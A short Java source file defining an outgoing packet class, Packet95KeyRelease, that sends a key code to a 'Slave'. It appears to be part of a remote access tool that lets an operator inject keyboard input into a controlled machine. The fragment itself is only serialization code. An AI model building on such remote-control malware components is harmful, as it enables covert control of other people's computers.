package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet95KeyRelease extends AbstractOutgoingPacket {
	
	private int keyCode;
	
	public Packet95KeyRelease(int keyCode) {
		this.keyCode = keyCode;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(keyCode);
	}

	@Override
	public byte getPacketId() {
		return 95;
	}

}
